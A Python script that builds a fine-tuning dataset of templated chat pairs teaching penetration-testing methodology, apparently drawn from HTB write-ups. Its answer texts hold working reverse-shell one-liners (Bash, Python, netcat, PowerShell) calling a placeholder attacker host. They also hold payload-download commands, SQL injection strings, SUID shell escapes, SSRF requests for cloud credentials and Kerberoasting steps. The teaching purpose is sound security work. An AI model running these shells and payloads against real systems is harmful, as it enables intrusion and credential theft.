#!/usr/bin/env python3
"""
Improved Training Data Processor for HTB Writeups
Generates conceptual Q&A pairs instead of verbatim writeup dumps.

Key improvements:
- Removes specific IPs, usernames, timestamps
- Creates generalized technique explanations
- Focuses on methodology not specific machine details
- Shorter, more focused responses
"""

import json
import re
import os
from pathlib import Path
from collections import defaultdict

# Paths
SCRIPT_DIR = Path(__file__).parent
DATA_DIR = SCRIPT_DIR.parent / "data"
RAW_DIR = DATA_DIR / "raw"
OUTPUT_DIR = DATA_DIR / "training"


def clean_text(text):
    """Remove specific details that cause memorization."""
    # Remove specific IPs
    text = re.sub(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', '[TARGET_IP]', text)

    # Remove specific ports in common patterns
    text = re.sub(r'oxdf@hacky\$', '[attacker]$', text)
    text = re.sub(r'oxdf@\w+\$', '[attacker]$', text)

    # Remove timestamps
    text = re.sub(r'\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}(:\d{2})?(\s+[A-Z]{3})?', '[TIMESTAMP]', text)

    # Remove specific hashes/flags
    text = re.sub(r'[a-f0-9]{32}', '[HASH/FLAG]', text)

    # Remove long hex strings
    text = re.sub(r'[a-f0-9]{40,}', '[LONG_HEX]', text)

    # Clean up excessive whitespace
    text = re.sub(r'\n{3,}', '\n\n', text)

    return text.strip()


def extract_technique_from_section(section_title, content):
    """Extract the core technique/concept from a section."""
    # Map section titles to technique categories
    technique_map = {
        'nmap': 'port scanning and service enumeration',
        'gobuster': 'web directory enumeration',
        'feroxbuster': 'web directory enumeration',
        'ffuf': 'web fuzzing and enumeration',
        'burp': 'web request interception and manipulation',
        'sqlmap': 'SQL injection testing',
        'hydra': 'credential brute forcing',
        'john': 'password hash cracking',
        'hashcat': 'password hash cracking',
        'linpeas': 'Linux privilege escalation enumeration',
        'winpeas': 'Windows privilege escalation enumeration',
        'bloodhound': 'Active Directory enumeration',
        'crackmapexec': 'Windows/AD lateral movement',
        'evil-winrm': 'Windows remote management',
        'impacket': 'Windows protocol exploitation',
        'metasploit': 'exploitation framework usage',
        'msfvenom': 'payload generation',
        'chisel': 'tunneling and port forwarding',
        'ssh': 'SSH tunneling and access',
        'reverse shell': 'obtaining remote access',
        'privilege escalation': 'elevating privileges',
        'lateral movement': 'moving between systems',
    }

    section_lower = section_title.lower()
    for key, technique in technique_map.items():
        if key in section_lower:
            return technique
    return None


def create_conceptual_qa(technique, context, tool=None):
    """Create a conceptual Q&A pair for a technique."""
    qa_templates = {
        'port scanning and service enumeration': {
            'questions': [
                "How do I perform initial port scanning on a target?",
                "What's the methodology for service enumeration?",
                "How do I identify running services on a target?",
            ],
            'answer_template': """Port scanning is typically the first step in reconnaissance. Here's the approach:

1. **Quick scan** - Start with a fast scan to identify open ports:
   ```
   nmap -p- --min-rate 10000 [TARGET_IP]
   ```

2. **Service enumeration** - Follow up with detailed service detection:
   ```
   nmap -p [PORTS] -sCV [TARGET_IP]
   ```
   - `-sC`: Run default scripts
   - `-sV`: Version detection

3. **Key things to look for**:
   - Web servers (80, 443, 8080)
   - SSH (22) - potential entry point
   - SMB (445) - Windows shares
   - Database ports (3306, 1433, 5432)
   - Domain services (88, 389, 636) - indicates AD environment

Always document your findings and investigate each service systematically."""
        },

        'web directory enumeration': {
            'questions': [
                "How do I enumerate directories on a web server?",
                "What tools should I use for web content discovery?",
                "How do I find hidden paths on a website?",
            ],
            'answer_template': """Web directory enumeration helps find hidden content. Here's the methodology:

1. **Choose your tool** - Common options:
   - `gobuster` - Fast, Go-based
   - `feroxbuster` - Recursive, Rust-based
   - `ffuf` - Flexible fuzzing

2. **Basic enumeration**:
   ```
   gobuster dir -u http://[TARGET] -w /usr/share/wordlists/dirb/common.txt
   ```

3. **Advanced options**:
   - Add extensions: `-x php,txt,html,bak`
   - Increase threads: `-t 50`
   - Follow redirects: `-r`
   - Check for backups: `-x bak,old,~`

4. **Good wordlists**:
   - `common.txt` - Quick initial scan
   - `directory-list-2.3-medium.txt` - Thorough scan
   - Technology-specific lists (PHP, ASP, etc.)

5. **Things to investigate**:
   - Admin panels
   - Backup files
   - Configuration files
   - API endpoints"""
        },

        'SQL injection testing': {
            'questions': [
                "How do I test for SQL injection vulnerabilities?",
                "What's the methodology for SQL injection attacks?",
                "How do I use sqlmap effectively?",
            ],
            'answer_template': """SQL injection testing requires a methodical approach:

1. **Identify injection points**:
   - URL parameters
   - POST data
   - Headers (Cookie, User-Agent)
   - JSON/XML input

2. **Manual testing** - Try basic payloads:
   ```
   ' OR '1'='1
   ' OR 1=1--
   " OR ""="
   1' AND '1'='1
   ```

3. **Automated testing with sqlmap**:
   ```
   sqlmap -u "http://target/page?id=1" --batch --dbs
   ```

4. **Key sqlmap options**:
   - `--dbs`: Enumerate databases
   - `--tables -D dbname`: List tables
   - `--dump -T tablename`: Extract data
   - `--os-shell`: Try to get shell
   - `--technique=BEUSTQ`: Specify techniques

5. **Post-exploitation**:
   - Look for credentials in database
   - Check for file read/write capabilities
   - Attempt OS command execution"""
        },

        'password hash cracking': {
            'questions': [
                "How do I crack password hashes?",
                "What's the difference between john and hashcat?",
                "How do I identify hash types?",
            ],
            'answer_template': """Password cracking is essential for pivoting. Here's the approach:

1. **Identify the hash type**:
   - Use `hashid` or `hash-identifier`
   - Check hash length and format
   - Common types: MD5 (32 chars), SHA1 (40), NTLM (32), bcrypt ($2a$)

2. **Using John the Ripper**:
   ```
   john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
   john --show hash.txt  # View cracked passwords
   ```

3. **Using Hashcat** (faster with GPU):
   ```
   hashcat -m [MODE] hash.txt /usr/share/wordlists/rockyou.txt
   ```
   Common modes: 0=MD5, 1000=NTLM, 1800=SHA-512, 3200=bcrypt

4. **Tips**:
   - Start with common wordlists (rockyou.txt)
   - Use rules for mutations: `--rules=best64`
   - Try username variations as passwords
   - Check for password reuse across accounts"""
        },

        'Linux privilege escalation enumeration': {
            'questions': [
                "How do I enumerate for privilege escalation on Linux?",
                "What should I check for Linux privesc?",
                "How do I use LinPEAS effectively?",
            ],
            'answer_template': """Linux privilege escalation requires thorough enumeration:

1. **Quick wins to check first**:
   ```
   sudo -l                    # Sudo permissions
   find / -perm -4000 2>/dev/null  # SUID binaries
   cat /etc/crontab           # Cron jobs
   ls -la /etc/passwd /etc/shadow  # Password file permissions
   ```

2. **Automated enumeration**:
   ```
   ./linpeas.sh | tee linpeas_output.txt
   ```

3. **Key areas to investigate**:
   - **SUID/SGID binaries** - Check GTFOBins for exploits
   - **Sudo permissions** - Even restricted sudo can be abused
   - **Cron jobs** - Writable scripts or PATH hijacking
   - **Capabilities** - `getcap -r / 2>/dev/null`
   - **Writable /etc/passwd** - Add new root user
   - **Kernel exploits** - Check version with `uname -a`

4. **Common escalation paths**:
   - Misconfigured sudo rules
   - Writable service files
   - Docker/LXC group membership
   - Password files in home directories"""
        },

        'Windows privilege escalation enumeration': {
            'questions': [
                "How do I enumerate for privilege escalation on Windows?",
                "What should I check for Windows privesc?",
                "How do I use WinPEAS?",
            ],
            'answer_template': """Windows privilege escalation enumeration checklist:

1. **Basic system info**:
   ```
   systeminfo
   whoami /priv
   whoami /groups
   net user
   ```

2. **Automated enumeration**:
   ```
   .\winpeas.exe
   ```

3. **Key areas to check**:
   - **Token privileges** - SeImpersonate, SeBackup, etc.
   - **Service misconfigurations** - Unquoted paths, weak permissions
   - **Scheduled tasks** - Writable scripts
   - **AlwaysInstallElevated** - MSI privilege escalation
   - **Stored credentials** - `cmdkey /list`
   - **Autologon creds** - Registry

4. **Common escalation paths**:
   - **Potato attacks** - If SeImpersonatePrivilege is enabled
   - **Service exploitation** - Modify service binary path
   - **DLL hijacking** - Missing DLLs in writable paths
   - **Unquoted service paths** - Space in path without quotes

5. **Useful commands**:
   ```
   reg query HKLM /f password /t REG_SZ /s
   dir /s *pass* == *cred* == *vnc* == *.config*
   ```"""
        },

        'Active Directory enumeration': {
            'questions': [
                "How do I enumerate an Active Directory environment?",
                "What is BloodHound and how do I use it?",
                "How do I find attack paths in AD?",
            ],
            'answer_template': """Active Directory enumeration is crucial for domain attacks:

1. **Initial enumeration**:
   ```
   # Get domain info
   crackmapexec smb [DC_IP] -u '' -p ''

   # Enumerate users
   crackmapexec smb [DC_IP] -u user -p pass --users
   ```

2. **BloodHound collection**:
   ```
   # Using SharpHound
   .\SharpHound.exe -c All

   # Using bloodhound-python (Linux)
   bloodhound-python -u user -p pass -d domain.local -ns [DC_IP] -c all
   ```

3. **Key things to look for**:
   - **Kerberoastable accounts** - SPNs on user accounts
   - **AS-REP roastable** - No preauth required
   - **DCSync rights** - Replication privileges
   - **Delegation** - Unconstrained/constrained delegation
   - **Group memberships** - Nested admin groups

4. **Attack paths**:
   - User → Group → Admin
   - Kerberoasting → Crack hash → Lateral movement
   - AS-REP roasting → Offline cracking
   - Password spraying → Valid creds"""
        },

        'tunneling and port forwarding': {
            'questions': [
                "How do I set up port forwarding through a compromised host?",
                "What is chisel and how do I use it?",
                "How do I pivot through a network?",
            ],
            'answer_template': """Tunneling and port forwarding enable pivoting through networks:

1. **SSH tunneling** (if SSH access available):
   ```
   # Local port forward
   ssh -L 8080:internal_host:80 user@pivot_host

   # Dynamic SOCKS proxy
   ssh -D 1080 user@pivot_host
   ```

2. **Chisel** (when SSH not available):
   ```
   # On attacker (server)
   ./chisel server -p 8000 --reverse

   # On target (client)
   ./chisel client [ATTACKER_IP]:8000 R:8080:127.0.0.1:80
   ```

3. **Common scenarios**:
   - Access internal web apps
   - Reach internal network segments
   - Bypass firewall restrictions
   - Pivot to additional targets

4. **Tips**:
   - Use proxychains with SOCKS proxies
   - Configure /etc/proxychains.conf
   - Run tools through proxy: `proxychains nmap -sT`
   - Remember: Only TCP through SOCKS"""
        },
    }

    if technique in qa_templates:
        template = qa_templates[technique]
        import random
        question = random.choice(template['questions'])
        answer = template['answer_template']
        return {'question': question, 'answer': answer}

    return None


def extract_techniques_from_writeup(content):
    """Extract techniques mentioned in a writeup."""
    techniques = set()

    # Tool patterns
    tool_patterns = [
        (r'\bnmap\b', 'port scanning and service enumeration'),
        (r'\bgobuster\b|\bferoxbuster\b|\bffuf\b', 'web directory enumeration'),
        (r'\bsqlmap\b|sql injection', 'SQL injection testing'),
        (r'\bjohn\b|\bhashcat\b|crack.*hash', 'password hash cracking'),
        (r'\blinpeas\b|linux.*priv.*esc', 'Linux privilege escalation enumeration'),
        (r'\bwinpeas\b|windows.*priv.*esc', 'Windows privilege escalation enumeration'),
        (r'\bbloodhound\b|active directory', 'Active Directory enumeration'),
        (r'\bchisel\b|port forward|tunnel', 'tunneling and port forwarding'),
    ]

    content_lower = content.lower()
    for pattern, technique in tool_patterns:
        if re.search(pattern, content_lower):
            techniques.add(technique)

    return techniques


def generate_conceptual_dataset():
    """Generate conceptual Q&A pairs from writeups."""
    qa_pairs = []
    techniques_used = defaultdict(int)

    # Get all technique templates
    all_techniques = [
        'port scanning and service enumeration',
        'web directory enumeration',
        'SQL injection testing',
        'password hash cracking',
        'Linux privilege escalation enumeration',
        'Windows privilege escalation enumeration',
        'Active Directory enumeration',
        'tunneling and port forwarding',
    ]

    # Generate multiple variations for each technique
    for technique in all_techniques:
        for _ in range(50):  # 50 variations each
            qa = create_conceptual_qa(technique, "", None)
            if qa:
                qa_pairs.append({
                    'messages': [
                        {'role': 'user', 'content': qa['question']},
                        {'role': 'assistant', 'content': qa['answer']}
                    ]
                })
                techniques_used[technique] += 1

    # Add additional conceptual Q&A pairs
    additional_qa = [
        {
            'question': "What's the general methodology for attacking a machine?",
            'answer': """A systematic approach to penetration testing follows these phases:

1. **Reconnaissance**
   - Passive: OSINT, DNS lookups, public records
   - Active: Port scanning, service enumeration

2. **Enumeration**
   - Deep dive into discovered services
   - Look for versions, misconfigurations
   - Web: directories, parameters, technologies

3. **Exploitation**
   - Identify vulnerabilities
   - Develop or find exploits
   - Gain initial access

4. **Post-Exploitation**
   - Enumerate from inside
   - Find credentials, sensitive data
   - Identify privilege escalation paths

5. **Privilege Escalation**
   - Escalate to root/SYSTEM
   - Document the path

6. **Lateral Movement** (if applicable)
   - Move to other systems
   - Expand access

Always document everything and maintain notes!"""
        },
        {
            'question': "How do I approach web application testing?",
            'answer': """Web application testing methodology:

1. **Technology identification**:
   - Wappalyzer, WhatWeb
   - Check response headers
   - Identify CMS, frameworks

2. **Content discovery**:
   - Directory brute forcing
   - Check robots.txt, sitemap.xml
   - Look for backup files (.bak, .old, ~)

3. **Input testing**:
   - Test all parameters for injection
   - Try SQL, XSS, command injection
   - Test file upload functionality

4. **Authentication testing**:
   - Default credentials
   - Password policies
   - Session management

5. **Authorization testing**:
   - IDOR vulnerabilities
   - Privilege escalation
   - Access control bypass

6. **Common vulnerabilities**:
   - SQL Injection
   - XSS (Reflected, Stored, DOM)
   - SSRF
   - LFI/RFI
   - Insecure deserialization"""
        },
        {
            'question': "What are common ways to get a reverse shell?",
            'answer': """Common reverse shell methods:

1. **Bash**:
   ```
   bash -i >& /dev/tcp/[ATTACKER]/[PORT] 0>&1
   ```

2. **Python**:
   ```
   python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("[ATTACKER]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
   ```

3. **Netcat**:
   ```
   nc -e /bin/sh [ATTACKER] [PORT]
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER] [PORT] >/tmp/f
   ```

4. **PowerShell**:
   ```
   powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('[ATTACKER]',[PORT]);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"
   ```

5. **Upgrading shells**:
   ```
   python -c 'import pty;pty.spawn("/bin/bash")'
   # Then: Ctrl+Z
   stty raw -echo; fg
   export TERM=xterm
   ```

Always set up listener first: `nc -lvnp [PORT]`"""
        },
        {
            'question': "How do I transfer files to a target?",
            'answer': """File transfer methods for penetration testing:

1. **Python HTTP server** (attacker):
   ```
   python3 -m http.server 8000
   ```
   Then on target: `wget http://[ATTACKER]:8000/file` or `curl`

2. **SMB server** (for Windows targets):
   ```
   impacket-smbserver share . -smb2support
   ```
   Target: `copy \\\\[ATTACKER]\\share\\file .`

3. **Netcat**:
   ```
   # Receiver
   nc -lvnp 4444 > file
   # Sender
   nc [TARGET] 4444 < file
   ```

4. **Base64 encoding** (when other methods fail):
   ```
   # Encode
   base64 file > file.b64
   # Copy-paste content
   # Decode
   base64 -d file.b64 > file
   ```

5. **PowerShell download**:
   ```
   Invoke-WebRequest -Uri http://[ATTACKER]/file -OutFile file
   certutil -urlcache -f http://[ATTACKER]/file file
   ```

6. **SCP** (if SSH available):
   ```
   scp file user@target:/path/
   ```"""
        },
        {
            'question': "What is Kerberoasting and how does it work?",
            'answer': """Kerberoasting is an Active Directory attack targeting service accounts:

**How it works**:
1. Any domain user can request TGS tickets for services with SPNs
2. TGS tickets are encrypted with the service account's password hash
3. Attacker requests tickets and cracks them offline

**Attack steps**:

1. **Find Kerberoastable accounts**:
   ```
   GetUserSPNs.py domain/user:password -dc-ip [DC]
   ```

2. **Request TGS tickets**:
   ```
   GetUserSPNs.py domain/user:password -dc-ip [DC] -request
   ```

3. **Crack the hashes**:
   ```
   hashcat -m 13100 hashes.txt wordlist.txt
   ```

**Why it's effective**:
- Service accounts often have weak passwords
- No special privileges needed to request tickets
- Attack is mostly offline (hard to detect)

**Mitigations**:
- Use strong passwords for service accounts
- Use Group Managed Service Accounts (gMSA)
- Monitor for excessive TGS requests"""
        },
        {
            'question': "How do I exploit SUID binaries for privilege escalation?",
            'answer': """SUID binaries can be exploited for privilege escalation:

**Finding SUID binaries**:
```
find / -perm -4000 -type f 2>/dev/null
```

**Exploitation methodology**:

1. **Check GTFOBins** - https://gtfobins.github.io/
   Many standard binaries can be abused if SUID

2. **Common exploitable binaries**:
   - `find`: `find . -exec /bin/sh -p \;`
   - `vim`: `:!/bin/sh`
   - `python`: `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
   - `bash`: `bash -p`

3. **Custom binaries**:
   - Check for command injection
   - Look for library hijacking opportunities
   - Analyze with strings/strace/ltrace

4. **PATH hijacking**:
   If SUID binary calls another binary without full path:
   ```
   export PATH=/tmp:$PATH
   echo '/bin/bash -p' > /tmp/[called_binary]
   chmod +x /tmp/[called_binary]
   ```

**Note**: The `-p` flag preserves effective UID when spawning shell"""
        },
        {
            'question': "What is SSRF and how do I exploit it?",
            'answer': """Server-Side Request Forgery (SSRF) allows attackers to make requests from the server:

**Identification**:
- URL parameters that fetch remote resources
- PDF generators, image processors
- Webhook/callback functionality

**Basic exploitation**:
1. **Internal port scanning**:
   ```
   http://vulnerable.com/fetch?url=http://127.0.0.1:22
   ```

2. **Access internal services**:
   ```
   http://vulnerable.com/fetch?url=http://192.168.1.1/admin
   ```

3. **Cloud metadata** (AWS):
   ```
   http://169.254.169.254/latest/meta-data/
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ```

**Bypass techniques**:
- Different IP formats: `127.0.0.1`, `0x7f000001`, `2130706433`
- DNS rebinding
- URL encoding
- Using `@` in URL: `http://attacker.com@127.0.0.1`

**Impact**:
- Access internal services
- Read cloud credentials
- Pivot to internal network
- Potentially RCE via internal services"""
        },
    ]

    for qa in additional_qa:
        # Add multiple times to balance dataset
        for _ in range(30):
            qa_pairs.append({
                'messages': [
                    {'role': 'user', 'content': qa['question']},
                    {'role': 'assistant', 'content': qa['answer']}
                ]
            })

    return qa_pairs, techniques_used


def main():
    print("=" * 60)
    print("Conceptual Training Data Generator")
    print("=" * 60)
    print()

    # Generate conceptual Q&A pairs
    print("[1/2] Generating conceptual Q&A pairs...")
    qa_pairs, techniques_used = generate_conceptual_dataset()

    print(f"  Generated {len(qa_pairs)} Q&A pairs")
    print()
    print("  Technique distribution:")
    for technique, count in sorted(techniques_used.items()):
        print(f"    - {technique}: {count}")
    print()

    # Save to file
    print("[2/2] Saving training data...")
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    output_path = OUTPUT_DIR / "htb_conceptual.json"
    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump(qa_pairs, f, indent=2, ensure_ascii=False)

    print(f"  Saved to: {output_path}")
    print()

    # Save metadata
    metadata = {
        'total_pairs': len(qa_pairs),
        'techniques': dict(techniques_used),
        'type': 'conceptual',
        'description': 'Generalized penetration testing concepts and techniques'
    }

    metadata_path = OUTPUT_DIR / "metadata_conceptual.json"
    with open(metadata_path, 'w', encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)

    print("=" * 60)
    print("Complete!")
    print("=" * 60)
    print()
    print("Next: Run train_model.py with the new dataset")
    print(f"  Update DATASET_PATH to: {output_path}")


if __name__ == "__main__":
    main()
